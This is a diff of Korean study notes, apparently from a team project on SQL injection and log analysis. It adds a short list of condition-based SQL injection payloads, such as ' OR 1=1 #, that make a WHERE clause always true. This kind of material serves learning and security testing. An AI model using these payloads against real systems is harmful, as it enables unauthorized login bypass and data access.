@@ -4,9 +4,14 @@ SQL injection: 주민서, 이종학
 log 분석: 김현서, 허남정, 오성택
 
 ---
-####  1. 조건문을 이용한 SQL Injection
+###  1. 조건문을 이용한 SQL Injection
 이 유형의 payload는 WHERE절의 조건을 항상 참으로 만들어 조건을 우회하는 방법 입니다.
 
-
+- ' OR 1=1 #
+- ' OR TRUE #
+- ' OR '1'='1' #
+- ' OR '1'='1' LIMIT 1 #
+- ' OR TRUE LIMIT 1 #
+- ' OR 1=1 LIMIT 5 #
 
 
